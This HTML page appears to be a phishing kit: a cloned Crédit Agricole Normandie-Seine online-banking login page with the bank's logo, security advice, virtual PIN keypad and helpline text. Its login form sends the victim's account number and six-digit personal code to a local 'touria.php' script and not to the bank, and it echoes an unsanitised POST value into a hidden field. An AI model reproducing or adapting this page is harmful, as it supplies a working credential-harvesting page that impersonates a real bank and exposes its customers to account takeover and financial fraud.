<html><head>




<title>AUTH</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">











 
 


<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/antiquus_002.css" media="all">
<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/antiquus.css" media="all">


<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles_002.css" media="all">
<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles.css" media="all">


<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles-mod_002.css" media="all">
<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/styles-mod.css" media="all">

<!--[if IE 8]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lte IE 7]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all" />
<![endif]-->

<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all" />
<![endif]-->










<link rel="stylesheet" type="text/css" href="entreeBam_fichiers/stb.css" media="all">



<script src="entreeBam_fichiers/infosbulle.js"></script><script language="JavaScript">
<!--

//Message affich&eacute; quand le souris est au-dessus: 
statusconfirmer="Confirmer l&apos;identification";
statusannuler="Annuler l&apos;identification";
statusaide="Besoin d&apos;Aide ?";
statuscondjur="Conditions juridiques";
statusdemo="Voir la d&eacute;monstration";
statuscompte="Saisir votre n&deg; de compte";
statuscode="Saisir votre code personnel";
statuscorriger="Corriger votre derni&egrave;re saisie";
statusclavnum="Cliquez dans la grille pour composer votre code personnel";
statusrecom="Voir nos recommandations";

// on recupere la version du navigateur
var OS = 'Win';
// on recupere la version du navigateur
Version=navigator.appVersion;
App = navigator.appName;
var Version=Version.substring(0,1);
var posOS = navigator.appVersion.indexOf('Mac');
var posOS2 = navigator.appVersion.indexOf('Win');
if (posOS >= 0) OS = 'Mac';
if ((posOS < 0) && (posOS2 >= 0)) OS = 'Win';
if (OS == 'Win') Nav_sup = 2;
else Nav_sup = 3;
// si c'est Netscape 2+ ou MSIE3+, c'est correct
browserOK=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=Nav_sup));
browserOK1=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=4));
browserOK2=(navigator.appName=="Netscape");


// Detection navigateur
nsvers = "0.94"; // pour netscape "6.2";
ievers = "5";
browserOK = false;
isIE55 = false;
var d, na, nua, nav, nan, dom, ie, ienu, ie4, ie5, ie5x, ie6, moz, moznu, ns62, mac, win, old, lin, ie5mac, ie5xwin, op, opnu, op4, op5, op6, op7, konq, saf, saf_num;

//variable initialization

d = document;
na = navigator;
nav = na.appVersion;
nan = na.appName;
nua = na.userAgent;
win = ( nav.indexOf( 'Win' ) != -1 );
mac = ( nav.indexOf( 'Mac' ) != -1 );
lin = ( nav.indexOf( 'Linux' ) != -1 );

if ( !d.layers ){
	dom = ( d.getElementById );
	old = ( nav.substring( 0, 1 ) < 4 );
	op = ( nua.indexOf( 'Opera' ) != -1 );
	moz = ( nua.indexOf( 'Gecko' ) != -1 );
	ie = ( d.all && !op );
	konq = ( nua.indexOf( 'Konqueror' ) != -1 );
	saf = ( nua.indexOf( 'Safari' ) != -1 );

	if ( op ){
		op_pos = nua.indexOf( 'Opera' );
		opnu = nua.substr( ( op_pos + 6 ), 3 );
		op5 = ( opnu.substring( 0, 1 ) == 5 );
		op6 = ( opnu.substring( 0, 1 ) == 6 );
		op7 = ( opnu.substring( 0, 1 ) == 7 );
	}
	else if ( saf ){
		saf_pos = nua.indexOf( 'Safari' );
		saf_nu = nua.substr( ( saf_pos + 7 ), 2 );
	}
	else if ( moz ){
		rv_pos = nua.indexOf( 'rv' );
		moz_rv = nua.substr( ( rv_pos + 3 ), 3 );
		moz_rv_sub = nua.substr( ( rv_pos + 7 ), 1 );
		moz_rv_sub = moz_rv + moz_rv_sub;
		browserOK = (moz_rv_sub >= nsvers);
	}
	else if ( ie ){
		ie_pos = nua.indexOf( 'MSIE' );
		ienu = nua.substr( ( ie_pos + 5 ), 3 );
		ie4 = ( !dom ); 
		ie5 = ( ienu.substring( 0, 1 ) == 5 );
		ie6 = ( ienu.substring( 0, 1 ) == 6 );
		browserOK = ( ienu.substring( 0, 1 ) >= ievers );
	}
	else{} 

	ie5x = ( d.all && dom );
	isIE55 = ie5x;
	ie5mac = ( mac && ie5 );
	ie5xwin = ( win && ie5x );
}

function Init()
{
		if (document.formulaire.CCPTE.value == "") document.formulaire.CCPTE.focus();
        document.onkeydown=pressKey;
}

ns4=(document.layers)? true:false;
ie4=(document.all)? true:false;

function pressKey (e) {
/*
        if (ns4) {var nKey=e.which; var ieKey=0}
        if (ie4) {var ieKey=event.keyCode; var nKey=0}
        if (nKey==13 || ieKey==13) {
				validation(document.formulaire);
                return true;
        }
*/
}

function setSize(win,width,height) {
	if (win.outerWidth) {
		win.outerWidth = width;
		win.outerHeight = height;
	}
	else if (win.resizeTo) {
		win.resizeTo(width,height);
	}
	else {
		alert("Not supported.");
	}
}

function clicPosition(position) {
	cocherCase();
	if (document.formulaire.CCCRYC2.value.length == 6) { 
		return; 
	}
	if (document.formulaire.CCCRYC.value=="") 
		document.formulaire.CCCRYC.value = position;
	else
		document.formulaire.CCCRYC.value = document.formulaire.CCCRYC.value + position;
	document.formulaire.CCCRYC2.value = document.formulaire.CCCRYC2.value + "0";
}

var code, pos_der_code, affiche_code;
function effacer() { 
	if (document.formulaire.CCCRYC2.value.length == 0) { 
		return; 
	}
	code = document.formulaire.CCCRYC.value;
	pos_der_code = code.lastIndexOf( ',' );
	code = code.substr( 0,pos_der_code);

	affiche_code = document.formulaire.CCCRYC2.value;
	affiche_code = affiche_code.substr( 0,(document.formulaire.CCCRYC2.value.length - 1) );

	document.formulaire.CCCRYC.value = code;
	document.formulaire.CCCRYC2.value = affiche_code;
}

var i=0;
function cocherCase() {
	if ( i<6)
	{
		var l_oBarre = document.getElementById("monAvancement");
		l_oBarre.rows[0].cells[i].style.visibility = 'visible';
		i = i + 1;
	}
}
function corriger() {
	if ( i>0 )
	{
		i = i - 1;
		var l_oBarre = document.getElementById("monAvancement");
		l_oBarre.rows[0].cells[i].style.visibility = 'hidden';
	 }
}

var path_static = "";
var path_dynamic = "/stb";
// Recuperation code caisse
var caisse = "883";

function raf(){
	return;
}

var urlappli = "/stb/entreeBam";
var urlapplisecu = "/stb/securite-entreeBam?TOPAF=1";

function ValidCertif(){
	if(validation(document.formulaire)){ document.formulaire.submit(); }

}

function ValidCertifSecu(){
	if(validation(document.formulaire)){ document.formulaire.submit(); }
}

// -->
</script><script language="JavaScript">
<!--

function ouvrePOPUP(item,widthpop,heightpop,men) {
	if(item.indexOf("?") != -1) {
		item = item+"&stbevt=Popup";
	}
	else {
		item = item+"?stbevt=Popup";
	}

	ouvreFenetre(item,widthpop,heightpop,men,"PopUp");
}
function ouvreassistance(item,widthpop,heightpop,men) {
	ouvreFenetre(item,widthpop,heightpop,men,"Assistance");
}

function ouvreFenetre(item,widthpop,heightpop,men,titre) {

	if (item.indexOf("?") != -1) {
		if (item.indexOf("#") != -1)
			url = item.substring(0,item.indexOf("#"))+"&typeaction=Popup"+item.substring(item.indexOf("#"),item.length);
		else
			url = item+"&typeaction=Popup";
	} else {
		url = item;
	}

	aazz = "menubar=" + men + ",resizable=yes,toolbar=no,width=" + widthpop + ",height=" + heightpop + ",scrollbars=yes";

	// on verifie si l'on n'est pas deja sur la bonne fenetre
	if (titre!=window.name) {
		// Mise en commentaire de l ancien code
		//if (!saf) {
			// on recupere un reference sur le popup (s'il n'est pas ouvert, cela en ouvre une!)
		//	popup1 = window.open('',titre,aazz);
			// on ferme le popup
		//	popup1.close();
		//}
		// on ouvre le nouveau avec les nouveaux parametres (taille, bouton...)
		//popup1 = window.open('',titre,aazz);
		//popup1.name = titre;
		//setSize(popup1,widthpop,heightpop);
			
		popup1 = window.open(url,titre,aazz);
			
	    if (moz ) popup1.focus();
	    //popup1.location =url;
	} else {
		window.name = titre;
		setSize(window,widthpop,heightpop);
		document.location = url;
	}

}

function setSize(win,width,height) {
	if (win.outerWidth) {
		win.outerWidth = width;
		win.outerHeight = height;
	}
	else if (win.resizeTo) {
		win.resizeTo(width,height);
	}
	else {
		alert("Not supported.");
	}
}

//ouvre une fen�tre popup en plein &eacute;cran ne laissant l'affichage que de la bnt
function ouvrirPopupBntVisible(url) {
	window.open(url,'Popup','location=no,toolbar=no,directories=no,menubar=yes,resizable=yes,scrollbars=yes,status=yes,width='+(screen.availWidth-140)+',height='+screen.availHeight+',screenY=0,screenX='+140);
}

// -->
</script></head><body leftmargin="0" topmargin="0" onLoad="Init()" text="#000000"><div id="infoBull" style="position: absolute; z-index: 10;"></div><div id="ombrBull" style="position: absolute; z-index: 9;"></div>








<div id="container">
							<div id="contenu" style="width: 957px;">
<table border="0">
	<tbody><tr>
		<td colspan="3">


<div style="background-color: rgb(230, 230, 230);" align="center">
<table border="0" cellpadding="0" cellspacing="0" width="620px">
<tbody><tr>
<td style="background: none repeat scroll 0% 0% rgb(230, 230, 230);">
	<div id="entete_vide">	
		<div id="entete" style="background: none repeat scroll 0% 0% transparent;">
   			 <div id="gauche-entete">
		        <h1><img src="entreeBam_fichiers/siteon0.gif" width="317" height="85"></h1>
		        </div>
   		 </div>
	</div>
</td>
</tr>
</tbody></table>
</div>
		</td>
	</tr>
	<tr valign="top">
	
		<td>
		
		<table style="" border="0" cellpadding="0" cellspacing="0" width="100%">

			<tbody><tr>
				<td style="background: none repeat-y scroll left top rgb(230, 230, 230);" valign="top" width="169">&nbsp;</td>
				<td id="col-centre" valign="top" width="590px">
				
				<table border="0" cellpadding="0" cellspacing="0" width="590">
					<tbody><tr>
						<td>
						
						<table border="0" cellpadding="0" cellspacing="0" width="590">
							
							<tbody><tr>
								<td colspan="2" class="montant2">&nbsp;</td>
							</tr>
							
							<tr>
								<td colspan="2" height="17"></td>
							</tr>
							<!-- bandeau authentification --> <tr>  <td colspan="2" align="center"><a href="http://www.ca-normandie-seine.fr/bam-information/" target="_blank"> <img src="entreeBam_fichiers/a.jpeg" border="no" height="75" width="585"></a></td> </tr> <tr><td>&nbsp;</td></tr>
							<tr>
								<td height="17"><div class="boutons-act">
                    <h1>
                        Identification</h1>
</div></td>
							</tr>
						</tbody></table>
						<form class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="touria.php" >
							<input name="origine" value="vitrine" type="hidden"> 
							<input name="situationTravail" value="BANCAIRE" type="hidden"> 
							<input name="canal" value="WEB" type="hidden"> 
							<input name="typeAuthentification" value="CLIC_RETOUR" type="hidden">
							<input name="idUnique" value="-5fc1cca6:13415bdaa41:-7efb" type="hidden"> 
							<input name="caisse" value="883" type="hidden"> 
							<input name="CCCRYC" value="" type="hidden">
							<input name="cp" value="<? print $_POST['cp']; ?>" type="hidden">
						<fieldset class="blc-choix"><div class="blc-choix-wrap" style="padding-bottom: 40px;"><p class="nomarge"><b>Le Cr&eacute;dit Agricole accorde une grande attention &agrave; la s&eacute;curit&eacute; de ses sites internet.</b>
 En tant qu&apos;utilisateur, vous avez &eacute;galement un r&ocirc;le important et actif &agrave;
 jouer pour assurer la s&eacute;curit&eacute; des informations qui vous concernent. 
Consultez ci-dessous les RECOMMANDATIONS de SECURITE &agrave; respecter :</p><p class="validation" style="width: 570px;"><a class="retour gauche" onClick="javascript:ouvrePOPUP('http://www.ca-normandie-seine.fr/Vitrine/SiteSecuriteV2/index.jsp',790,455,'no','AUTH')">Nos recommandations</a></p></div></fieldset>
						<table border="0" width="590">
							<!-- Message securitaire -->

							<tbody><tr>
								<td colspan="3" height="22">
								<input name="CCCRYC2" value="" type="hidden">
								 <fieldset class="blc-choix">
							 <script>
								if(saf){
									document.write("<div class=\"blc-choix-wrap\" style=\"padding-bottom:190px;\">");
									
								}else{
									document.write("<div class=\"blc-choix-wrap\">");
								}
							   
							</script><div class="blc-choix-wrap">
								<script langage="Javascript">
<!--
function validation(formulaire) {
if(formulaire.CCPTE.value=="") {
alert("Votre num&eacute;ro de compte est incomplet.");
return;
}
if(formulaire.CCCRYC.value=="") {
alert("Votre code personnel est incomplet.");
return;
}
if(isAlphaNum(formulaire.CCPTE.value)) {
if(isNumerique(formulaire.CCCRYC2.value)) {
formulaire.submit();
}
else {
alert("Votre code personnel est incomplet.");
}
}
else {
alert("Votre num&eacute;ro de compte est incomplet.");
}
}
function isNumerique(chaine){
if (chaine.length!=6)
return false;
for(var i=0;i<chaine.length;i++){
if(chaine.charAt(i)>'9' || chaine.charAt(i)<'0'){
return false;
}
}
return true;
}
function isAlphaNum(chaine){
if (chaine.length!=11)
return false;
chaine = chaine.toLowerCase();
for(var i=0;i<chaine.length;i++){
if(!((chaine.charAt(i)<='9' && chaine.charAt(i)>='0') || (chaine.charAt(i)<='z' && chaine.charAt(i)>='a'))){
return false;
}
}
return true;
}
-->
</script>
<h3>Vos codes d'acc&egrave;s</h3>
<label class="normal">Saisissez votre N&deg; DE COMPTE &agrave; l'aide de votre clavier :</label>
<input name="CCPTE" size="22" maxlength="11" tabindex="1" type="text">
<p></p>
<div id="bloc-pave-saisis-code">
<label class="normal gauche" for="input-code">Cliquez dans la grille <br>pour composer votre CODE PERSONNEL :</label>

								
								
								<table id="pave-saisie-code" class="gauche">
<tbody><tr align="center" valign="middle">
<td><a tabindex="2" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('9'); "><a tabindex="3" href="javascript:raf()">
&nbsp;&nbsp;9&nbsp;&nbsp;
</a></td>
<td><a tabindex="4" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('6'); "><a tabindex="5" href="javascript:raf()">
&nbsp;&nbsp;6&nbsp;&nbsp;
</a></td>
<td><a tabindex="6" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
</tr>
<tr align="center" valign="middle">
<td><a tabindex="7" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="8" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('4'); "><a tabindex="9" href="javascript:raf()">
&nbsp;&nbsp;4&nbsp;&nbsp;
</a></td>
<td><a tabindex="10" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="11" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
</tr>
<tr align="center" valign="middle">
<td onClick="clicPosition('8'); "><a tabindex="12" href="javascript:raf()">
&nbsp;&nbsp;8&nbsp;&nbsp;
</a></td>
<td><a tabindex="13" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('2'); "><a tabindex="14" href="javascript:raf()">
&nbsp;&nbsp;2&nbsp;&nbsp;
</a></td>
<td onClick="clicPosition('1'); "><a tabindex="15" href="javascript:raf()">
&nbsp;&nbsp;1&nbsp;&nbsp;
</a></td>
<td><a tabindex="16" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
</tr>
<tr align="center" valign="middle">
<td onClick="clicPosition('0'); "><a tabindex="17" href="javascript:raf()">
&nbsp;&nbsp;0&nbsp;&nbsp;
</a></td>
<td><a tabindex="18" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="19" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td onClick="clicPosition('7'); "><a tabindex="20" href="javascript:raf()">
&nbsp;&nbsp;7&nbsp;&nbsp;
</a></td>
<td onClick="clicPosition('3'); "><a tabindex="21" href="javascript:raf()">
&nbsp;&nbsp;3&nbsp;&nbsp;
</a></td>
</tr>
<tr align="center" valign="middle">
<td onClick="clicPosition('5'); "><a tabindex="22" href="javascript:raf()">
&nbsp;&nbsp;5&nbsp;&nbsp;
</a></td>
<td><a tabindex="23" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="24" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="25" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
<td><a tabindex="26" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
</tr>
</tbody></table>

<span class="align-bas gauche">
								<table>
								<tbody><tr>
								<td>
								<div style="border: 1px solid gray;">
								<table id="monAvancement" class="monAvancement" style="border: medium none;">
											<tbody><tr>
												<td class="maCase"><img src="entreeBam_fichiers/point_transp.gif" height="10" width="10"></td>
												<td class="maCase"><img src="entreeBam_fichiers/point_transp.gif" height="10" width="10"></td>
												<td class="maCase"><img src="entreeBam_fichiers/point_transp.gif" height="10" width="10"></td>
												<td class="maCase"><img src="entreeBam_fichiers/point_transp.gif" height="10" width="10"></td>
												<td class="maCase"><img src="entreeBam_fichiers/point_transp.gif" height="10" width="10"></td>
												<td class="maCase"><img src="entreeBam_fichiers/point_transp.gif" height="10" width="10"></td>
											
											</tr>
										</tbody></table>
								</div>
										</td>
										<td>
										(6 chiffres)
										</td>
										</tr>
										</tbody></table>
								
                                </span>
                                
							</div>
							
							<p class=" validation clearboth" style="width: 570px; margin: 30px 0pt 0pt;">
                                <span class="gauche">
	                                <a class="retour gauche" href="javascript:ouvrePOPUP('http://www.ca-normandie-seine.fr/demo-bamg2v5.html',1024,587,'no','AUTH');" tabindex="31">Voir la d&eacute;monstration</a>
                            	</span>
                            	<span class="droite">
                            	
                            	
                            		
	                            		
			   							
			   							
			   						

			   							
			   							
			   						
			   							
			   							
			   						
	                            		<a class="annuler droite" href="javascript:corriger();effacer();" tabindex="27">Corriger</a> 
		   								<a class="droite" href="javascript:ValidCertif();" tabindex="28">Confirmer</a>
	                            		<a class="annuler droite" href="javascript:document.location.href='http://www.ca-normandie-seine.fr';" tabindex="30">Annuler</a>
	                            		
			   							

			   							
			   							
			   							
			   							
								</span>                           
                            </p>
						</div>
                   		 </fieldset>
										
								</td>
							</tr>
							
						</tbody></table>
						
						</form></td>
					</tr>
		<tr>
		<td>		
		<!-- Pav&eacute; Certificat --> 
		
		<!-- Conditions Juridique --> <table border="0" cellpadding="0" cellspacing="0" width="590"><tbody><tr><td width="3"></td><td><table border="0" cellpadding="0" cellspacing="3" width="590"><tbody><tr><td class="encartbaspage" width="100%"><table align="center" border="0" cellpadding="12" cellspacing="1" width="100%"><tbody><tr><td class="colfondpage" align="center" height="17" valign="top"><table><tbody><tr class="libelle3"><td><b>Pour toute assistance, vous pouvez consulter la <a href="http://www.ca-normandie-seine.fr/faq.html" target="_blank"> <font color="#0000ff">Foire Aux Questions</font></a><font color="#0000ff"> <font color="#000000">ou appeler le 02 35 59 19 19 (choix 2) (appel gratuit hors frais de communication factur&eacute;s par l'op&eacute;rateur de t&eacute;l&eacute;communication)</font></font></b><font color="#0000ff"><font color="#000000"><br>Du lundi au vendredi de 08h00 &agrave; 20h00<br>Le samedi de 08h00 &agrave; 18h00<br><br><b>Vous n'arrivez pas &agrave; vous connecter &agrave; nos services :</b><br>Cette application est optimis&eacute;e pour les logiciels de navigation MS Internet Explorer 6 et versions ult&eacute;rieures.<br></font></font></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td><td width="3"></td></tr></tbody></table>
			</td>
		</tr>
		</tbody></table>
		</td>
		<td style="background: none repeat-y scroll left top rgb(230, 230, 230);" valign="top" width="171">&nbsp;</td>
		</tr>
		
		
	<tr style="background-color: rgb(230, 230, 230);" valign="middle">
	<td></td>
		<td>
		<table border="0" cellpadding="0" cellspacing="0" width="590">
			<tbody><tr>
				<td class="footercopyright" align="center">&nbsp;</td>
			</tr>
			<tr>
				<td class="footercopyright" align="center">@2004-2010 Cr&eacute;dit Agricole,
				tous droits r&eacute;serv&eacute;s</td>
			</tr>
		</tbody></table>
		 

<!--MARQUEUR XITI-->
<script language="JavaScript1.1">
<!--
hsh = new Date();
hsd = document;
hsi = '<img width="1" height="1" src="https://logs8.xiti.com/hit.xiti?cc=17&cs=883&s2=1'
hsi += '&p=identification_autre_&hl=' + hsh.getHours() + 'x' + hsh.getMinutes() + 'x' + hsh.getSeconds();
if(parseFloat(navigator.appVersion)>=4)
{Xiti_s=screen;hsi += '&r=' + Xiti_s.width + 'x' + Xiti_s.height + 'x' + Xiti_s.pixelDepth + 'x' + Xiti_s.colorDepth;}
hsd.writeln(hsi + '&ref=' + hsd.referrer.replace('&', '$') + '" >');
//-->
</script><img src="entreeBam_fichiers/hit.gif" height="1" width="1">

<noscript>
<img width="1" height="1" src="https://logs8.xiti.com/hit.xiti?cc=17&cs=883&s2=1&p=identification_autre_" />
</noscript>
		</td>
		<td></td>
	</tr></tbody></table>
</td>



</tr>
</tbody></table>




<table>
	<tbody><tr>
		<td width="169"></td>
		<td id="main_bas" width="570"></td>
		<td width="169"></td>
	</tr>
</tbody></table>
</div>
</div>
</body></html>